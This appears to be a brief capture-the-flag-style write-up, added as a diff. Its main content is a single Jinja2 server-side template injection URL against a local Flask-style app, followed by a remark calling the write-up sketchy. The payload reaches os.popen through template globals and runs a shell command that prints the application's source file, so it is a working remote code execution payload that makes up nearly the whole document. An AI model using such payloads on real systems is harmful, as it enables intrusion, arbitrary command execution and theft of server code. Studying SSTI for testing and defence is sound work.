@@ -1,0 +1,3 @@
+http://localhost:5000?name={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat%20/app/app.py').read()}}
+
+(sketchy write-up, the variable should have been loaded in the memory)
